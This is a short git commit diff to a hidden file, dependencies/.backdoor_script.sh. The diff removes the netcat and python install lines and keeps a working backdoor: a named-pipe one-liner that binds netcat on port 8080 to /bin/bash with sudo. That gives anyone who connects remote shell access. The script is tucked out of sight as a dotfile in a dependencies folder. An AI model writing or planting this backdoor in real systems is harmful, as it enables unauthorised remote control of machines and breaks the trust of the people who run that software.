461fe4b4a24f466bb68ca1bbce3f5b63c887ffef
David Bootle <d.bootle18@psaschool.org>
2020-02-07 14:32:02 -0500

    Update .backdoor_script.sh

--- dependencies/.backdoor_script.sh
+++ dependencies/.backdoor_script.sh
@@ -1,11 +1,5 @@
 #Netcat 8080 backdoor
 
-#Installs dependencies
-sudo apt install netcat-traditional
-sudo apt install netcat-openbsd
-sudo apt install netcat
-sudo apt install python
-
 #Simulates the old "nc -e" command, opens nc backdoor
 sudo mkfifo foo ; nc -lk 8080 0<foo | /bin/bash 1>foo
 
